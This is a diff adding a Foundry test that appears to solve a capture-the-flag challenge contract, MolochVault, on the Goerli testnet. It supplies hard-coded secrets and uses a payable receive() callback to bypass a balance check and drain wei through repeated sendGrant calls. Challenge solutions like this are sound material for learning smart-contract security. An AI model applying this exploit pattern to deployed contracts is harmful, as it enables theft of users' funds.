@@ -1,0 +1,39 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+import "forge-std/Test.sol";
+import "../src/MolochVault.sol";
+
+contract SolveMolochVaultGoerli is Test {
+	MOLOCH_VAULT vault;
+
+	function setUp() public {
+		vault = MOLOCH_VAULT(payable(0xafb9ed5cd677a1bd5725ca5fcb9a3a0572d94f6f));
+	}
+
+	function testhack() public {
+		string[3] memory openSecret;
+
+		openSecret[0] = "BLOODY PHARMACIST";
+		openSecret[1] = "WHO DO YOUSERVE?";
+		openSecret[2] = "";
+		// bytes memory x1 = abi.encodePacked(openSecret[0]);
+		// console.logBytes(x1);
+		// bytes memory x2 = abi.encodePacked(openSecret[0], openSecret[1]);
+		// console.logBytes(x2);
+
+		payBack = true; // need to pay 2 wei to bypass the balance check
+		vault.uhER778(openSecret); // this should register us as `realHacker`
+
+		payBack = false; // don't pay back when receive ether
+		vault.sendGrant(payable(this)); // get back 1 wei that we send in the `receive()`
+		vault.sendGrant(payable(this)); // steal 1 wei
+	}
+
+	bool payBack;
+	receive() external payable {
+		if(payBack) {
+			address(msg.sender).call{value:2 wei}("");
+		}
+	}
+}
